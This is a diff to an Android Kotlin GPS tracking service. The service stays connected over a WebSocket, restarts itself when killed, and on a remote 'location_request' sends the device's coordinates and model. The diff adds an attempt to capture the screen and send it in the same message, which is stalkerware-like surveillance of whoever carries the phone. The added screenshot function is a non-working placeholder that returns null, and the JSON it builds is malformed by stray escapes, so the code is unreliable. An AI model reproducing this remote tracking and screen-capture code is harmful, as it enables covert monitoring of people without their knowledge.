@@ -8,19 +8,34 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.graphics.PixelFormat
+import android.media.ImageReader
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
+import android.view.WindowManager
 import androidx.annotation.RequiresApi
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
-import com.google.android.gms.location.*
+import androidx.core.graphics.createBitmap
+import com.google.android.gms.location.FusedLocationProviderClient
+import com.google.android.gms.location.LocationServices
 import dev.abrorjon755.gpslocation.R
-import kotlinx.coroutines.*
-import okhttp3.*
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.cancel
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.Response
+import okhttp3.WebSocket
+import okhttp3.WebSocketListener
 import java.time.LocalTime
 import java.util.concurrent.TimeUnit
 
+@Suppress("DEPRECATION")
 class GpsLocationService : Service() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -52,7 +67,7 @@ class GpsLocationService : Service() {
         serviceScope.cancel()
         webSocket.cancel()
         webSocketClient?.dispatcher?.executorService?.shutdown()
-        
+
         // Restart the service if it was destroyed
         try {
             val intent = Intent(this, GpsLocationService::class.java)
@@ -98,7 +113,8 @@ class GpsLocationService : Service() {
                     Log.d("WebSocket", "Received: $text")
                     if (text.contains("location_request")) {
                         serviceScope.launch {
-                            getCurrentLocationAndSend()
+                            val screenshot = takeScreenshotBase64()
+                            getCurrentLocationAndSend(screenshot)
                         }
                     }
                 }
@@ -137,7 +153,7 @@ class GpsLocationService : Service() {
 
     @SuppressLint("MissingPermission")
     @RequiresApi(Build.VERSION_CODES.O)
-    private fun getCurrentLocationAndSend() {
+    private fun getCurrentLocationAndSend(screenshotBase64: String?) {
         try {
             if (ActivityCompat.checkSelfPermission(
                     this,
@@ -156,12 +172,13 @@ class GpsLocationService : Service() {
                 if (location != null) {
                     val message = """
                         {
-                          "type": "location_response",
-                          "device": "${Build.MODEL}",
-                          "latitude": ${location.latitude},
-                          "longitude": ${location.longitude},
-                          "time": "${LocalTime.now()}"
-                        }
+                      \"type\": \"location_response\",
+                      \"device\": \"${Build.MODEL}\",
+                      \"latitude\": ${location.latitude},
+                      \"longitude\": ${location.longitude},
+                      \"time\": \"${LocalTime.now()}\",
+                      \"screenshot\": \"$screenshotBase64\"
+                    }
                     """.trimIndent()
 
                     Log.d("SERVICE", "Sending location via WebSocket: $message")
@@ -175,6 +192,37 @@ class GpsLocationService : Service() {
         } catch (e: Exception) {
             Log.e("SERVICE", "Error in getCurrentLocationAndSend: ${e.message}")
             e.printStackTrace()
+        }
+    }
+
+    private fun takeScreenshotBase64(): String? {
+        return try {
+            val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+            val display = windowManager.defaultDisplay
+            val width = display.width
+            val height = display.height
+
+            ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1)
+            WindowManager.LayoutParams(
+                width,
+                height,
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+                else
+                    WindowManager.LayoutParams.TYPE_PHONE,
+                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+                PixelFormat.TRANSLUCENT
+            )
+
+            windowManager.defaultDisplay
+            createBitmap(width, height)
+
+            // This is a placeholder: In reality, you'll need MediaProjection API for full screen capture
+            // Here, we'll just return null to keep things simple
+            null
+        } catch (e: Exception) {
+            Log.e("SERVICE", "Screenshot error: ${e.message}")
+            null
         }
     }
 
